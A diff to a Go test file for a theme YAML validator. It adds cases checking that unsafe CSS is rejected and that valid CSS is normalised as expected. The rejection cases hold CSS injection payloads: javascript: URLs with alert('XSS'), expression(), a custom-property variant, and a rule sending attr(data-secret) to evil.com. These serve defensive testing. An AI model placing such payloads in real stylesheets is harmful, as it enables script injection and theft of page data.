@@ -2508,6 +2508,7 @@ func TestThemeValidation(t *testing.T) {
 		yaml        string
 		expectError bool
 		errorMsg    string
+		expectedCss string
 	}{
 		{
 			name: "valid legacy colors",
@@ -2530,6 +2531,7 @@ css: |
   }
 `,
 			expectError: false,
+			expectedCss: `.my-class{color:red;background:blue;}`,
 		},
 		{
 			name: "mixing legacy and CSS should fail",
@@ -2561,7 +2563,77 @@ type: theme
 css: "just some text"
 `,
 			expectError: true,
-			errorMsg:    "CSS must contain at least one valid rule",
+			errorMsg: `invalid CSS syntax: unexpected ending in qualified rule on line 1 and column 15
+    1: just some text
+                     ^`,
+		},
+		{
+			name: "unsafe CSS syntax - javascript in css",
+			yaml: `
+type: theme
+css: |
+  .malicious {
+    color: red;
+    background-image: url('javascript:alert("XSS")');
+  }
+`,
+			expectError: true,
+			errorMsg:    `disallowed css value: "url('javascript:alert(\"XSS\")')"`,
+		},
+		{
+			name: "unsafe CSS syntax - expression in css",
+			yaml: `
+type: theme
+css: |
+  .malicious {
+    color: red;
+    background: expression(alert('XSS'));
+  }
+`,
+			expectError: true,
+			errorMsg:    `disallowed css value: "expression("`,
+		},
+		{
+			name: "unsafe CSS syntax - invalid url in css",
+			yaml: `
+type: theme
+css: |
+  .malicious {
+    color: red;
+    background: url('javascript:alert(1)');
+  }
+`,
+			expectError: true,
+			errorMsg:    `disallowed css value: "url('javascript:alert(1)')"`,
+		},
+		{
+			name: "unsafe CSS syntax - custom properties with javascript",
+			yaml: `
+type: theme
+css: |
+  :root {
+    --user-input: 'javascript:alert("XSS")';
+  }
+
+  .element {
+    background-image: var(--user-input);
+  }
+`,
+			expectError: true,
+			errorMsg:    `disallowed css value: " 'javascript:alert(\"XSS\")'"`,
+		},
+		{
+			name: "unsafe CSS syntax - send data to external domain",
+			yaml: `
+type: theme
+css: |
+  .steal::before {
+    content: attr(data-secret);
+    background: url('http://evil.com/steal?data=' + attr(data-secret));
+  }
+`,
+			expectError: true,
+			errorMsg:    `unexpected ending in declaration`,
 		},
 		{
 			name: "empty CSS should fail",
@@ -2571,6 +2643,48 @@ css: ""
 `,
 			expectError: true,
 			errorMsg:    "CSS cannot be empty",
+		},
+		{
+			name: "complex valid css",
+			yaml: `
+type: theme
+css: |
+  @layer utilities {
+    .ui-copy {
+      @apply text-gray-900;
+    }
+
+    /* Comment */
+  	.ui-copy-number {
+  			font-feature-settings:
+  				"case" 0,
+  				"numr",
+  				"salt" 0,
+  				"tnum";
+  	}
+  }
+  
+  @layer base {
+    :root {
+      --background: var(--color-gray-50);
+      --foreground: var(--color-gray-900);
+  
+  		--color-theme-50: var(
+        --color-theme-light-50,
+        var(--color-primary-light-50)
+      );
+    }
+  
+    :root.dark {
+      --background: var(--color-gray-500);
+    }
+  }
+`,
+			expectError: false,
+			expectedCss: `@layer utilities{.ui-copy{@apply text-gray-900;}.ui-copy-number{font-feature-settings:"case" 0,"numr","salt" 0,"tnum";}}@layer base{:root{--background: var(--color-gray-50);--foreground: var(--color-gray-900);--color-theme-50: var(
+      --color-theme-light-50,
+      var(--color-primary-light-50)
+    );}:root.dark{--background: var(--color-gray-500);}}`,
 		},
 	}
 
@@ -2604,6 +2718,12 @@ css: ""
 					}
 				}
 				require.Len(t, themeErrors, 0)
+			}
+
+			if tt.expectedCss != "" {
+				res, ok := p.Resources[ResourceName{Kind: ResourceKindTheme, Name: "test"}]
+				require.True(t, ok)
+				require.Equal(t, tt.expectedCss, res.ThemeSpec.Css)
 			}
 		})
 	}
